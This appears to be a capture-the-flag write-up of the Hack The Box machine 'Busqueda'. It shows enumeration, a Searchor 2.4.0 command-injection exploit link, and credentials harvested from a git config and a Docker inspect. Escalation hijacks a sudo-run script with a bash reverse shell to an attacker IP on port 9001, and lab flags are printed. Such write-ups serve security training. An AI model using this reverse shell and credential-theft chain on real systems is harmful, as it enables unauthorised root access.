Busqueda: Vulnerabilities: Searchor 2.4.0, git config files, sensitive exposed files, 

Enumeration:
sudo nmap -sC -sV -p- --min-rate=1000 10.129.228.217

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

echo 10.129.228.217 search.htb | sudo tee -a /etc/hosts

On the bottom of the website:
Powered by Flask and Searchor 2.4.0  


https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-43364 

Searchor is an all-in-one PyPi Python Library that simplifies web scraping, obtaining information on an topic, and generating search query URLs. Searchor is an a efficient tool for Python developers, with many web development needs in one, with support of over 100+ Engines and custom engines allowed, making it easy for developers to use for their web programming needs in Python without relying on many third-party dependencies. Furthermore, Searchor has a wide range of support, including command line interface and pip.

https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection 


svc@busqueda:~$ cat user.txt
cat user.txt
26ee05a39acd04fde75befb4ea49364c

Now we managed to get this into a metasploit by using an attack machine to create a payload and host it for the victim to grab from.

We are now running a post exploitation for privilege escalation using multi/recon/local_exploit_suggester 

 #   Name                                                               Potentially Vulnerable?  Check Result
 -   ----                                                               -----------------------  ------------
 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
 2   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.

I tried both and they didn't work 

cat /var/www/app/.git/config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main

sudo -S -l
[sudo] password for svc: jh1usoih2bkjaspwe92
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup

sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq

"Tty": false, "OpenStdin": false, "StdinOnce": false, "Env": [ "USER_UID=115", "USER_GID=121", "GITEA__database__DB_TYPE=mysql", "GITEA__database__HOST=db:3306", "GITEA__database__NAME=gitea", "GITEA__database__USER=gitea", "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh", "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "USER=git", "GITEA_CUSTOM=/data/gitea" ], "Cmd": [ "/bin/s6-svscan", "/etc/s6" ],

http://gitea.searcher.htb/administrator 

We logged in using
User: Administrator
Password: yuiu1hoiu4i5ho1uh

http://gitea.searcher.htb/administrator/scripts/src/branch/main/system-checkup.py 

 try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')

This shows the script will execute commands from full-check.sh

cd ~/
nano full-checkup.sh

svc@busqueda:~$ cat full-checkup.sh 
#! /bin/bash

bash -i >& /dev/tcp/10.10.14.206/9001 0>&1

sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

This will execute reverse shell back into our attack machine which has netcat listener on port 9001

 root@busqueda:~# cat root.txt
cat root.txt
9fbf83de8821b803dedd28a6c7fd012f

Now we have root access:
